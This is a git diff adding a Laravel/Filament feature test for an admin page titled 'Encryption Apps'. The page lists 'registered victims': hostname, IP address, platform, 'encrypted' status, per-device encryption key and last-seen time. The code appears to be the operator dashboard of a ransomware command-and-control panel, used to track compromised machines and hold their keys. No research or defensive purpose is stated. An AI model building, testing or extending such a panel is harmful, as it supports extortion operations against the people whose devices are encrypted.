@@ -4,6 +4,7 @@ namespace Tests\Feature;
 
 use App\Filament\Admin\Pages\EncryptionApps;
 use App\Models\User;
+use App\Models\Victim;
 use Filament\Facades\Filament;
 use Filament\Pages\Auth\Login;
 use Illuminate\Foundation\Testing\RefreshDatabase;
@@ -22,6 +23,41 @@ class FilamentPanelTest extends TestCase
     public function test_guest_is_redirected_to_login_from_the_admin_dashboard(): void
     {
         $this->get('/admin')->assertRedirect('/admin/login');
+    }
+
+    public function test_admin_can_view_victim_records_in_the_admin_panel(): void
+    {
+        $victim = Victim::create([
+            'hostname' => 'DESKTOP-7M2K',
+            'ip_address' => '192.168.12.23',
+            'os' => 'Windows',
+            'status' => 'encrypted',
+            'encryption_key' => 'fernet-key-for-table-test',
+            'last_seen' => '2026-10-12 15:16:17',
+        ]);
+
+        $this->actingAs(User::factory()->create());
+        Filament::setCurrentPanel(Filament::getPanel('admin'));
+
+        $this->get('/admin/encryption-apps')
+            ->assertOk()
+            ->assertSee('Encryption Apps')
+            ->assertSee('REGISTERED VICTIMS')
+            ->assertSee('Review connected devices, their status, and recent activity.')
+            ->assertDontSee('href="http://localhost/admin/victims"', false)
+            ->assertSee('ID')
+            ->assertSee('Device')
+            ->assertSee('IP Address')
+            ->assertSee('Platform')
+            ->assertSee('Encryption Key')
+            ->assertSee('Status')
+            ->assertSee('Last Seen')
+            ->assertSee('Registered')
+            ->assertSee('Last Updated')
+            ->assertSee('DESKTOP-7M2K')
+            ->assertSee('192.168.12.23')
+            ->assertSee('Windows')
+            ->assertSee('encrypted');
     }
 
     public function test_user_can_log_in_and_open_the_admin_dashboard(): void
